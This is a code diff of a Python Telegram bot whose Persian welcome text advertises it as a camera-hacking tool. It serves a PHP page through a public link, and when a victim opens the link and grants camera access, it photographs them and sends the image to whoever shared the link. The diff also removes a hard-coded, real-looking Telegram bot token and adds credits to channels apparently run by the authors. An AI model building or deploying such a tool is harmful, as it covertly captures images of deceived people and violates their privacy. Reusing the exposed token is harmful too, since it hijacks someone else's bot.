@@ -9,7 +9,7 @@ from remain_up import remain_up
 
 remain_up()
 
-bot = telebot.TeleBot("1184232396:AAGQk1ZKK7ArXyg5uXe_Gr3R-BGwusGa8uY")
+bot = telebot.TeleBot("SET TOKEN")
 
 def run_php():
   subprocess.call('php -S 0.0.0.0:5000', shell=True)
@@ -29,17 +29,20 @@ def main():
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     pm1 = '''
-    سلام😼
-به ربات هک دوربین جلو با لینک خوش اومدی🤟
-👾اگه لینکتو واسه کسی بفرستی و اونم بازش کنه و دسترسی بده
-یه عکس ازش میگیره و واست میفرسته🤡
+سلام
+به ربات هک دوربین خوش اومدی👊
+🚧اگه لینکو برای کسی بفرسی و اونم بازش کنه و دسترسی بده 
+عکسشو میگیره و واست همینجا میفرسه📷
 
-📎 برای دریافت لینک روی دکمه "دریافت لینک" کلیک کن📍
 
-🛹 :) 🛢
+Telegram: @LinuxArmy
+YouTube: youtube.com/linuxarmy
+Programmer: @it4min
+
+🍀برای اینکه لینکتو دریافت کنی بزن رو دکمه زیر👇
     '''
     markup = types.ReplyKeyboardMarkup()
-    itembtna = types.KeyboardButton('دریافت لینک🖕')
+    itembtna = types.KeyboardButton('دریافت لینک')
     markup.row(itembtna)
     bot.send_message(message.chat.id, pm1, reply_markup=markup)
 
@@ -56,7 +59,7 @@ def send(message):
     ][0]
 
     if message.content_type == "text":
-        if message.text == "دریافت لینک🖕":
+        if message.text == "دریافت لینک":
             bot.reply_to(message, f'🎥{public_url}/?q={message.chat.id}')
         
 
